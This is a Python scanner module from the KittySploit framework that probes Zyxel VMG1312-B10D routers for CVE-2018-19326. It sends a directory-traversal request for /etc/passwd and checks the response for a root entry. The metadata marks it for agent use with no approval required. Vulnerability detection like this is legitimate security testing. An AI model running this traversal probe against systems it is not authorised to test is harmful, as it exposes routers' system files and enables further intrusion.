#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel VMG1312-B10D 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel VMG1312-B10D 5.13AAXA.8 - Local File Inclusion Detection',
        'description': 'Zyxel VMG1312-B10D 5.13AAXA.8 is susceptible to local file inclusion. A remote unauthenticated attacker can send a specially crafted URL request containing "dot dot" sequences (/../), conduct directory traversal attacks, and view arbitrary files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'modem', 'router', 'edb', 'zyxel', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45904',
            'https://www.cybersecurity-help.cz/vdb/SB2018120309',
            'https://www.zyxel.com/homepage.shtml',
            'https://gist.github.com/numanturle/4988b5583e5ebe501059bd368636de33',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-19326',
        ],
        'cve': 'CVE-2018-19326',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Zyxel VMG1312-B10D 5.13AAXA.8 - Local File Inclusion detected",
                path='/../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

